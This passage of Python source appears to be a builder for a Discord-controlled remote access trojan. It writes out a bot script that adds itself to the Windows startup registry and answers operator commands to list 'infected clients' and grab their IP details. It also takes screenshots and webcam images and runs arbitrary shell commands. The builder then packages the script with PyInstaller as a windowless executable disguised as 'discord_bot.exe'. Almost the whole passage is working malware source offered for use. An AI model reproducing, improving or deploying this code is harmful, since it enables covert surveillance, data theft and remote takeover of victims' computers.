            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DiscordBotClient", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {{e}}")

add_to_startup()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Bot connected as {{client.user}}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.strip()
    content_lower = content.lower()
    local_username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown User"

    if content_lower == "!help":
        embed = discord.Embed(
            title="All rat commands",
            description=(
                "**!help** - Shows this message\\n"
                "**!clients** - Show all infected clients\\n"
                "**!ip <username>** - Grab ip info of a client\\n"
                "**!screenshot <username>** - Take screenshot\\n"
                "**!webcam <username>** - Capture webcam\\n"
                "**!cmd <username> <command>** - Run a cmd command on clients pc"
            ),
            color=discord.Color.red()
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1373003383321133209/1374814896692265093/giphy.gif?ex=682f6ba6&is=682e1a26&hm=559ed38eb770fd1de6438112d281bb7bd42241dd021da8257d83cf2c70109d4e&")
        await message.channel.send(embed=embed)

    elif content_lower == "!clients":
        await message.channel.send(f"Client Username: `{{local_username}}`")

    elif content_lower.startswith("!ip"):
        parts = content.split()
        if len(parts) == 1:
            await message.channel.send("ERROR enter a client username: `!ip <username>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Error: No client named '{{requested_username}}' found.")
            return

        try:
            ipconfig_output = subprocess.check_output("ipconfig /all", shell=True, text=True, timeout=5)
        except Exception as e:
            ipconfig_output = f"Failed to run ipconfig /all: {{e}}"

        try:
            res = requests.get("https://ipinfo.io/json", timeout=5)
            if res.status_code == 200:
                ipinfo = res.json()
                ipinfo_str = "\\n".join([f"{{k}}: {{v}}" for k,v in ipinfo.items() if not k.startswith('readme')])
            else:
                ipinfo_str = f"Failed to get IP info of source: {{res.status_code}}"
        except Exception as e:
            ipinfo_str = f"Error getting ipinfo: {{e}}"

        embed = discord.Embed(
            title=f"IP Information for {{local_username}}",
            description=f"**ip address info:**\\n```{{ipconfig_output[:1000]}}```\\n**ip info from source> ipinfo.io:**\\n```{{ipinfo_str}}```",
            color=discord.Color.red()
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1373003383321133209/1374814511696973925/841krdvmenb61.png?ex=682f6b4a&is=682e19ca&hm=043274ddb1042993efd1b1f26e29545589398038f49fa557190356ebad4f4104&")
        await message.channel.send(embed=embed)

    elif content_lower.startswith("!screenshot"):
        parts = content.split()
        if len(parts) == 1:
            await message.channel.send("error no client name enterd: `!screenshot <username>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Error: No client called '{{requested_username}}' found.")
            return

        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
                screenshot_path = tmp_file.name
                screenshot.save(screenshot_path)

            embed = discord.Embed(
                title=f"Screenshot from {{local_username}}",
                color=discord.Color.purple()
            )
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1373003383321133209/1374815312104525896/360_F_107579101_QVlTG43Fwg9Q6ggwF436MPIBTVpaKKtb.jpg?ex=682f6c09&is=682e1a89&hm=f8d65ad9c9eb2a6fc5e72a154c1554040190167915e6f667f9729114fc636648&")
            embed.set_image(url="attachment://screenshot.png")

            with open(screenshot_path, "rb") as img_file:
                await message.channel.send(embed=embed, file=discord.File(img_file, filename="screenshot.png"))

            os.remove(screenshot_path)

        except Exception as e:
            await message.channel.send(f"ERROR failed to take/send screenshot: {{e}}")

    elif content_lower.startswith("!webcam"):
        parts = content.split()
        if len(parts) == 1:
            await message.channel.send("Usage: `!webcam <username>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Error: No client named '{{requested_username}}' found.")
            return

        try:

            cap = cv2.VideoCapture(0)


            if not cap.isOpened():
                await message.channel.send("Webcam not found or no access")
                return


            ret, frame = cap.read()
            if not ret:
                await message.channel.send("Failed to get image of webcam")
                return


            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp_file:
                webcam_path = tmp_file.name
                cv2.imwrite(webcam_path, frame)


            cap.release()

            embed = discord.Embed(
                title=f"Webcam Capture from {{local_username}}",
                color=discord.Color.blue()
            )
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1373003383321133209/1374815312104525896/360_F_107579101_QVlTG43Fwg9Q6ggwF436MPIBTVpaKKtb.jpg?ex=682f6c09&is=682e1a89&hm=f8d65ad9c9eb2a6fc5e72a154c1554040190167915e6f667f9729114fc636648&")
            embed.set_image(url="attachment://webcam.jpg")

            with open(webcam_path, "rb") as img_file:
                await message.channel.send(embed=embed, file=discord.File(img_file, filename="webcam.jpg"))

            os.remove(webcam_path)

        except Exception as e:
            await message.channel.send(f"ERROR capturing webcam: {{e}}")

    elif content_lower.startswith("!cmd"):
        parts = content.split()
        if len(parts) < 3:
            await message.channel.send("Usage: `!cmd <username> <command>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Error: No client named '{{requested_username}}' found.")
            return

        cmd_to_run = " ".join(parts[2:])
        try:
            output = subprocess.check_output(cmd_to_run, shell=True, text=True, timeout=10)
            if not output.strip():
                output = "(No output)"
            if len(output) > 1500:
                output = output[:1500] + "\\n...[truncated]"
        except Exception as e:
            output = f"Command execution failed: {{e}}"

        embed = discord.Embed(
            title=f"CMD Output from {{local_username}}",
            description=f"```{{output}}```",
            color=discord.Color.red()
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/1373003383321133209/1374815535279247630/istockphoto-1367766076-612x612.jpg?ex=682f6c3e&is=682e1abe&hm=0b37919d45e3535aa7102e24ec52b5d052902574f8629ffdd5422d3d9ce47f51&")
        await message.channel.send(embed=embed)

client.run(TOKEN)
'''

    script_filename = "bot_client.py"
    with open(script_filename, "w", encoding="utf-8") as f:
        f.write(bot_script)

    print(Fore.GREEN + "\nBULDING RAT" + Style.RESET_ALL)
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", script_filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "PyInstaller failed  make sure its installed with pip" + Style.RESET_ALL)
        time.sleep(2)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "discord_bot.exe"
    dist_path = os.path.join("dist", "bot_client.exe")
    final_path = os.path.join(downloads_path, exe_name)

    try:
        shutil.move(dist_path, final_path)
        print(Fore.CYAN + f"\nrat exe saved in:\n{final_path}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error moving file: {e}" + Style.RESET_ALL)

    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    if os.path.exists(script_filename):
        os.remove(script_filename)
    if os.path.exists("bot_client.spec"):
        os.remove("bot_client.spec")

    input(Fore.YELLOW + "\ndubble tap to go back" + Style.RESET_ALL)
    clear()
    show_tool_options()





if __name__ == "__main__":
    main()
